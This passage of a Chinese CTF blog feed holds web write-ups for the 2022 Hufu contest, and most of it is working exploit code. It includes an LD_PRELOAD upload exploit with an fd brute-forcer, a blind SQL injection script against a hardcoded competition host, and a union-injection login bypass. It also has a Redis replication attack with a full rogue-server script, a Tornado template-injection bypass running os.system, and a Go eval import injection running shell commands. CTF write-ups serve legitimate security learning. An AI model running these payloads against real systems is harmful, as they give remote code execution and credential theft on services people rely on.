class="hljs-keyword">as</span> f:<br>    file = f.read()<br>    <br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> file:<br>    date = re.findall(<span class="hljs-string">&quot; NULL, &#x27;(.*?)&#x27;&quot;</span>, line)[<span class="hljs-number">0</span>][<span class="hljs-number">8</span>:<span class="hljs-number">10</span>]<br>    <span class="hljs-keyword">if</span> date.startswith(<span class="hljs-string">&#x27;0&#x27;</span>):<br>        date = date[<span class="hljs-number">1</span>:]<br>    pos = <span class="hljs-built_in">int</span>(date) - <span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;, 5, 3,&quot;</span> <span class="hljs-keyword">in</span> line:<br>        total += <span class="hljs-built_in">float</span>(decrypt(line[-<span class="hljs-number">12</span>:-<span class="hljs-number">4</span>]))*bargain[pos]<br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>虎符初赛</title>
    <link href="/2022/07/24/2022-7-24-%E8%99%8E%E7%AC%A6ctf%E5%88%9D%E8%B5%9B/"/>
    <url>/2022/07/24/2022-7-24-%E8%99%8E%E7%AC%A6ctf%E5%88%9D%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="虎符ctf初赛"><a href="#虎符ctf初赛" class="headerlink" title="虎符ctf初赛"></a>虎符ctf初赛</h1><h1 id="java-ezchain"><a href="#java-ezchain" class="headerlink" title="java-ezchain"></a>java-ezchain</h1><p>参考文章&gt;<br><a href="http://novic4.cn/index.php/archives/23.html">http://novic4.cn/index.php/archives/23.html</a><br><a href="https://ha1c9on.top/?p=1973">https://ha1c9on.top/?p=1973</a></p><h1 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h1><p>nginx的临时缓存文件配合LD_PRELOAD</p><p><a href="https://lewin.co.il/winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021/">参考hxp题解</a><br>参考<a href="https://tttang.com/archive/1384/">https://tttang.com/archive/1384/</a></p><p>exp</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> threading<br><span class="hljs-keyword">import</span> Thread<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> time<br>port = <span class="hljs-number">8020</span><br>host = <span class="hljs-string">&quot;ip&quot;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">do_so</span>():</span><br>    data = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;evil.so&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read()<br><br>    packet = <span class="hljs-string">f&quot;&quot;&quot;POST /index.php HTTP/1.1\r\nHOST:<span class="hljs-subst">&#123;host&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span>\r\nContent-Length:<span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(data)+<span class="hljs-number">11</span>&#125;</span>\r\n\r\n&quot;&quot;&quot;</span><br>    packet = packet.encode()<br>    <br>    packet += data<br>    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    s.connect((host, port))<br>    s.sendall(packet)<br>    time.sleep(<span class="hljs-number">10</span>)<br>    s.close()<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>do_so()<br><br></code></pre></div></td></tr></table></figure><p>fd爆破</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Thread<br>port = <span class="hljs-number">8020</span><br>host = <span class="hljs-string">&quot;ip&quot;</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">ldload</span>(<span class="hljs-params">pid, fd</span>):</span><br>     sopath = <span class="hljs-string">f&quot;/proc/<span class="hljs-subst">&#123;pid&#125;</span>/fd/<span class="hljs-subst">&#123;fd&#125;</span>&quot;</span><br>     <span class="hljs-comment"># print(sopath)</span><br>     r = requests.get(<span class="hljs-string">f&quot;http://<span class="hljs-subst">&#123;host&#125;</span>:<span class="hljs-subst">&#123;port&#125;</span>/index.php&quot;</span>, params=&#123;<span class="hljs-string">&quot;env&quot;</span>:<span class="hljs-string">f&quot;LD_PRELOAD=<span class="hljs-subst">&#123;sopath&#125;</span>&quot;</span>&#125;)<br>     <span class="hljs-keyword">return</span> r<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br> <span class="hljs-comment"># ldload(20, 20)</span><br> <span class="hljs-keyword">for</span> pid <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">12</span>, <span class="hljs-number">40</span>):<br>     <span class="hljs-keyword">for</span> fd <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">40</span>):<br>         t = Thread(target=ldload, args=(pid, fd))<br>         t.start()<br></code></pre></div></td></tr></table></figure><h1 id="chain"><a href="#chain" class="headerlink" title="chain"></a>chain</h1><p>regexp配合短路与进行盲注。得到密码后对大小写进行爆破。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> string<br>url = <span class="hljs-string">&quot;http://47.107.231.226:20155/login&quot;</span><br><br>s = requests.session()<br>result= <span class="hljs-string">&#x27;&#x27;</span><br>password = <span class="hljs-string">&#x27;m&#x27;</span><br><span class="hljs-comment"># m52fpldxyylb++^</span><br><span class="hljs-comment"># M52fpLdxyYlB++  M52fpLdxyYlB  52fpLdxyYlB</span><br><span class="hljs-comment"># m52fpldxyylb^eizar!8gxH$</span><br><span class="hljs-comment"># M52fpLdxyYlB^eizAR!8gxH$</span><br><span class="hljs-comment">#qay8tefyzc67aeoo  qay8tEFYZc67aeoO</span><br><span class="hljs-comment">#qay8tEFYZc67aeoO</span><br><span class="hljs-comment">#  \\\\! \\\\@ \\\\$ \\\\% \\\\^ \\\\&amp;  \\\\_ \\\\+</span><br><span class="hljs-built_in">str</span> = string.ascii_letters + string.digits + <span class="hljs-string">&quot;!\@%^&amp;_+$&quot;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>)<br><span class="hljs-keyword">while</span>(<span class="hljs-literal">True</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>        <span class="hljs-keyword">if</span> i <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;!\@$%^&amp;_+&quot;</span>:<br>            i = <span class="hljs-string">&#x27;\\&#x27;</span> +<span class="hljs-string">&#x27;\\&#x27;</span> + i<br>        <span class="hljs-comment"># if i in &quot;#()*+,-.;?&quot;:</span><br>        <span class="hljs-comment">#     continue</span><br>        test = password +i<br><br>        data =    <span class="hljs-string">&quot;username=fdfd&#x27;or`password`regexp&#x27;^&quot;</span> + test + <span class="hljs-string">&quot;&#x27;or`password`regexp&#x27;^[&amp;password=123&quot;</span><br>        res = s.post(url,data,headers=&#123;<span class="hljs-string">&quot;Content-Type&quot;</span>:<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>&#125;)<br>        <span class="hljs-comment"># print(res.request.body)</span><br>        <span class="hljs-comment"># print(res.status_code)</span><br>        <span class="hljs-comment"># print(&quot;fdfd&#x27;or`password`regexp&#x27;^&#x27;&quot;+  test +&quot;or`password`regexp&#x27;^[&quot;)</span><br>        <span class="hljs-comment"># print(&quot;fdfd&#x27;or`password`regexp&#x27;^&#123;&#125;&#x27;or`password`regexp&#x27;^[&quot;.format(chr(i)))</span><br>        <span class="hljs-keyword">if</span> res.status_code ==<span class="hljs-number">401</span>:<br>            result +=i<br>            password = password +i<br>            <span class="hljs-built_in">print</span>(password)<br>            <span class="hljs-keyword">continue</span><br><br></code></pre></div></td></tr></table></figure><p>但是这样无法区别大小写所以还得爆破大小写登录，官方wp里面使用的是整数溢出触发错误+<code>COLLATE&#39;utf8mb4_bin或COLLATE&#39;utf8mb4_0900_as_cs</code>来区别大小写<br>payload</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">username</span>=b&#x27;||`password`COLLATE&#x27;utf<span class="hljs-number">8</span>mb<span class="hljs-number">4</span>_<span class="hljs-number">0900</span>_as_cs&#x27;like&#x27;m<span class="hljs-number">52</span>F§<span class="hljs-number">6</span>§%&#x27;&amp;&amp;`id`=&#x27;<span class="hljs-number">1</span>&#x27;||`password`regexp&#x27;[&amp;password=<span class="hljs-number">1</span><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>虎符决赛</title>
    <link href="/2022/07/24/2022-7-24-%E8%99%8E%E7%AC%A6%E5%86%B3%E8%B5%9B/"/>
    <url>/2022/07/24/2022-7-24-%E8%99%8E%E7%AC%A6%E5%86%B3%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<h1 id="虎符决赛"><a href="#虎符决赛" class="headerlink" title="虎符决赛"></a>虎符决赛</h1><h2 id="manager"><a href="#manager" class="headerlink" title="manager"></a>manager</h2><p>nodejs的replace函数存在<code>$</code>匹配符，可绕过双引号过滤。<br><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#description">https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace#description</a><br>然后联合查询让查出来的密码和输入密码相等即可</p><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-type">name</span>=$`<span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-string">&#x27;2&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>;<span class="hljs-comment">--+&amp;password=2</span><br></code></pre></div></td></tr></table></figure><p>登录之后发现可疑的url，发现这是个应用<code>Rocket.Chat</code>，下载之后连接即可。需要在hosts文件中把<code>secret-chat.manager.icq</code>和题目ip绑定</p><p><img src="https://img-blog.csdnimg.cn/5be84ac94d9046d9a259fed40ad9d86f.png" alt="在这里插入图片描述"></p><p>注册登录之后发现写了一个robot，并且可以执行redis命令。利用恶意redis服务器打主从复制</p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino">config set dir /tmp<br>config set dbfilename exp.so<br>slaveof vps port<br></code></pre></div></td></tr></table></figure><p>恶意服务脚本</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/local/bin python</span><br><span class="hljs-comment">#coding=utf8</span><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> time<br><br>CRLF=<span class="hljs-string">&quot;\r\n&quot;</span><br>payload=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;exp.so&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).read()<br>exp_filename=<span class="hljs-string">&quot;exp.so&quot;</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">redis_format</span>(<span class="hljs-params">arr</span>):</span><br>    <span class="hljs-keyword">global</span> CRLF<br>    <span class="hljs-keyword">global</span> payload<br>    redis_arr=arr.split(<span class="hljs-string">&quot; &quot;</span>)<br>    cmd=<span class="hljs-string">&quot;&quot;</span><br>    cmd+=<span class="hljs-string">&quot;*&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(redis_arr))<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:<br>        cmd+=CRLF+<span class="hljs-string">&quot;$&quot;</span>+<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(x))+CRLF+x<br>    cmd+=CRLF<br>    <span class="hljs-keyword">return</span> cmd<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">redis_connect</span>(<span class="hljs-params">rhost,rport</span>):</span><br>    sock=socket.socket()<br>    sock.connect((rhost,rport))<br>    <span class="hljs-keyword">return</span> sock<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">send</span>(<span class="hljs-params">sock,cmd</span>):</span><br>    sock.send(redis_format(cmd))<br>    <span class="hljs-built_in">print</span>(sock.recv(<span class="hljs-number">1024</span>).decode(<span class="hljs-string">&quot;utf-8&quot;</span>))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">RogueServer</span>(<span class="hljs-params">lport</span>):</span><br>    <span class="hljs-keyword">global</span> CRLF<br>    <span class="hljs-keyword">global</span> payload<br>    flag=<span class="hljs-literal">True</span><br>    result=<span class="hljs-string">&quot;&quot;</span><br>    sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.bind((<span class="hljs-string">&quot;0.0.0.0&quot;</span>,lport))<br>    sock.listen(<span class="hljs-number">10</span>)<br>    clientSock, address = sock.accept()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[92m[+]\033[0m Accepted connection from &#123;&#125;:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(address[<span class="hljs-number">0</span>], address[<span class="hljs-number">1</span>]))<br><br>    <span class="hljs-keyword">while</span> flag:<br>        data = clientSock.recv(<span class="hljs-number">1024</span>)<br>        <span class="hljs-built_in">print</span>(data)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;PING&quot;</span> <span class="hljs-keyword">in</span> data.decode():<br>            result=<span class="hljs-string">&quot;+PONG&quot;</span>+CRLF<br>            clientSock.send(result)<br>            flag=<span class="hljs-literal">True</span><br>            <span class="hljs-built_in">print</span>(result)<br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;REPLCONF&quot;</span> <span class="hljs-keyword">in</span> data:<br>            result=<span class="hljs-string">&quot;+OK&quot;</span>+CRLF<br>            clientSock.send(result)<br>            flag=<span class="hljs-literal">True</span><br>            <span class="hljs-built_in">print</span>(result)<br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;PSYNC&quot;</span> <span class="hljs-keyword">in</span> data <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;SYNC&quot;</span> <span class="hljs-keyword">in</span> data:<br>            result = <span class="hljs-string">&quot;+FULLRESYNC &quot;</span> + <span class="hljs-string">&quot;a&quot;</span> * <span class="hljs-number">40</span> + <span class="hljs-string">&quot; 1&quot;</span> + CRLF<br>            result += <span class="hljs-string">&quot;$&quot;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(payload)) + CRLF<br>            result = result.encode()<br>            result += payload<br>            result += CRLF<br>            clientSock.send(result)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[92m[+]\033[0m FULLRESYNC ...&quot;</span>)<br>            flag=<span class="hljs-literal">False</span><br>            <span class="hljs-comment">#print(result)</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\033[92m[+]\033[0m It&#x27;s done&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br><br>    lport=<span class="hljs-number">2333</span><br>    RogueServer(lport)<br></code></pre></div></td></tr></table></figure><p>执行命令知州读取flag即可<br><img src="https://img-blog.csdnimg.cn/52b51745b1b9480d8afb6fcece30d291.png" alt="在这里插入图片描述"></p><h2 id="龙卷风"><a href="#龙卷风" class="headerlink" title="龙卷风"></a>龙卷风</h2><p>python的tornado框架ssti注入，但是黑名单几乎把可以利用的都ban了</p><figure class="highlight ini"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ini"><span class="hljs-attr">black_func</span> = [<span class="hljs-string">&#x27;eval&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;chr&#x27;</span>, <span class="hljs-string">&#x27;class&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;dir&#x27;</span>, <span class="hljs-string">&#x27;exec&#x27;</span>, <span class="hljs-string">&#x27;filter&#x27;</span>, <span class="hljs-string">&#x27;attr&#x27;</span>, <span class="hljs-string">&#x27;globals&#x27;</span>, <span class="hljs-string">&#x27;help&#x27;</span>,<br>              <span class="hljs-string">&#x27;input&#x27;</span>, <span class="hljs-string">&#x27;local&#x27;</span>, <span class="hljs-string">&#x27;memoryview&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;print&#x27;</span>, <span class="hljs-string">&#x27;property&#x27;</span>, <span class="hljs-string">&#x27;reload&#x27;</span>, <span class="hljs-string">&#x27;object&#x27;</span>, <span class="hljs-string">&#x27;reduce&#x27;</span>, <span class="hljs-string">&#x27;repr&#x27;</span>,<br>              <span class="hljs-string">&#x27;method&#x27;</span>, <span class="hljs-string">&#x27;super&#x27;</span>, <span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;file&quot;</span>, <span class="hljs-string">&quot;decode&quot;</span>,<span class="hljs-string">&quot;request&quot;</span>,<span class="hljs-string">&quot;builtins&quot;</span>,<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;&amp;&quot;</span>]<br><br><span class="hljs-attr">black_symbol</span> = [<span class="hljs-string">&quot;__&quot;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;*&quot;</span>, <span class="hljs-string">&quot;,&quot;</span>, <span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;\\&quot;</span>,<span class="hljs-string">&quot;0x&quot;</span>,<span class="hljs-string">&quot;0o&quot;</span>,<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;*&quot;</span>]<br><span class="hljs-attr">black_keyword</span> = [<span class="hljs-string">&#x27;or&#x27;</span>, <span class="hljs-string">&#x27;while&#x27;</span>]<br><span class="hljs-attr">black_rce</span> = [<span class="hljs-string">&#x27;render&#x27;</span>, <span class="hljs-string">&#x27;module&#x27;</span>, <span class="hljs-string">&#x27;include&#x27;</span>,<span class="hljs-string">&#x27;if&#x27;</span>, <span class="hljs-string">&#x27;extends&#x27;</span>, <span class="hljs-string">&#x27;set&#x27;</span>, <span class="hljs-string">&#x27;raw&#x27;</span>, <span class="hljs-string">&#x27;try&#x27;</span>, <span class="hljs-string">&#x27;except&#x27;</span>, <span class="hljs-string">&#x27;else&#x27;</span>, <span class="hljs-string">&#x27;finally&#x27;</span>,<br>             <span class="hljs-string">&#x27;while&#x27;</span>, <span class="hljs-string">&#x27;for&#x27;</span>, <span class="hljs-string">&#x27;from&#x27;</span>, <span class="hljs-string">&#x27;import&#x27;</span>, <span class="hljs-string">&#x27;apply&#x27;</span>,<span class="hljs-string">&quot;True&quot;</span>,<span class="hljs-string">&quot;False&quot;</span>]<br></code></pre></div></td></tr></table></figure><p>发现可以利用unicode进行绕过，但是点号引号不知道怎么绕过了。赛后学习到了可以用request请求中携带我们需要执行的命令，然后利用<code>eval(repr(request)[x:x]</code>来获取url中的命令字符串并用eval执行命令。</p><p>脚本如下，切片的长度需要本地给黑名单去了先调试一下。</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#coding: utf-8</span><br><span class="hljs-keyword">import</span> requests<br><br>alphabet_encoded = <span class="hljs-string">&quot;𝟎𝟏𝟐𝟑𝟒𝟓𝟔𝟕𝟖𝟗𝐚𝐛𝐜𝐝𝐞𝐟𝐠𝐡𝐢𝐣𝐤𝐥𝐦𝐧𝐨𝐩𝐪𝐫𝐬𝐭𝐮𝐯𝐰𝐱𝐲𝐳𝐀𝐁𝐂𝐃𝐄𝐅𝐆𝐇𝐈𝐉𝐊𝐋𝐌𝐍𝐎𝐏𝐐𝐑𝐒𝐓𝐔𝐕𝐖𝐗𝐘𝐙ꓸ&quot;</span><br>alphabet = <span class="hljs-string">&quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.&quot;</span><br>bold_translation = <span class="hljs-built_in">str</span>.maketrans(alphabet, alphabet_encoded)<br><br><br><span class="hljs-comment"># payload = &quot;&#123;&#123;RequestHandlerꓸsettings&#125;&#125;&quot;</span><br>payload = <span class="hljs-string">&quot;eval(repr(request)&quot;</span><br><span class="hljs-built_in">print</span>(payload.translate(bold_translation))<br><br><br>payload = <span class="hljs-string">r&quot;__import__(&#x27;os&#x27;).system(chr(108)+chr(115)+chr(32)+chr(47)+chr(32)+chr(62)+chr(32)+chr(47)+chr(97)+chr(112)+chr(112)+chr(47)+chr(115)+chr(116)+chr(97)+chr(116)+chr(105)+chr(99)+chr(47)+chr(104)+chr(97)+chr(104)+chr(97)+chr(49)+chr(46)+chr(116)+chr(120)+chr(116))&quot;</span><br><br><span class="hljs-comment"># ls / &gt; /app/static/haha1.txt</span><br>burp0_url = <span class="hljs-string">&quot;http://127.0.0.1:8888/?aaa=&quot;</span> + payload<br>burp0_data = &#123;<span class="hljs-string">&quot;tornado&quot;</span>: <span class="hljs-string">&quot;&#123;&#123;𝐞𝐯𝐚𝐥(𝐫𝐞𝐩𝐫(𝐫𝐞𝐪𝐮𝐞𝐬𝐭)[84:&quot;</span>+ <span class="hljs-built_in">str</span>(<span class="hljs-number">84</span> + <span class="hljs-built_in">len</span>(payload)) +<span class="hljs-string">&quot;])&#125;&#125;&quot;</span>&#125;<br><span class="hljs-built_in">print</span>(burp0_data)<br>r = requests.post(burp0_url, data=burp0_data)<br><br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/04d7b784348342c68c50f090ada835a3.png" alt="在这里插入图片描述"></p><h2 id="readygo"><a href="#readygo" class="headerlink" title="readygo"></a>readygo</h2><p>过滤了大小写字母，最后面存在 eval.Eval执行命令<br><img src="https://img-blog.csdnimg.cn/f495dad21f4a4d1381fd49eb5fa132dd.png" alt="在这里插入图片描述"><br>在 eval.go源码里面<code>importStr</code>并没有过滤限制，并且是进行的简单字符串拼接。所以我们可以将后面的func注释掉，自己写func函数然后执行命令。<br><img src="https://img-blog.csdnimg.cn/eac3923086c64dc5a562c926747abd41.png" alt="在这里插入图片描述"><br>测试代码</p><figure class="highlight go"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;regexp&quot;</span><br>eval <span class="hljs-string">&quot;github.com/PaulXu-cn/goeval&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>Package := <span class="hljs-string">&quot;os/exec\&quot;\n\&quot;fmt\&quot;)\nfunc\nmain()\x09&#123;cmd:=exec.Command(\&quot;ls\&quot;,\&quot;-l\&quot;,\&quot;/\&quot;)\nout,_:=cmd.CombinedOutput()\nfmt.Println(string(out))/*&quot;</span><br>expression := <span class="hljs-string">&quot;*///&quot;</span><br>match, _ := regexp.MatchString(<span class="hljs-string">&quot;([a-zA-Z]+)&quot;</span>, expression)<br><span class="hljs-keyword">if</span> match &#123;<br>fmt.Print(<span class="hljs-string">&quot;Hacker????&quot;</span>)<br><span class="hljs-keyword">return</span><br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">if</span> res, err := eval.Eval(<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;fmt.Print(&quot;</span>+expression+<span class="hljs-string">&quot;)&quot;</span>, Package); <span class="hljs-literal">nil</span> == err &#123;<br>fmt.Println(<span class="hljs-keyword">string</span>(res))<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;Error&quot;</span>)<br>fmt.Print(err)<br>&#125;<br>&#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure>]]></content>
    
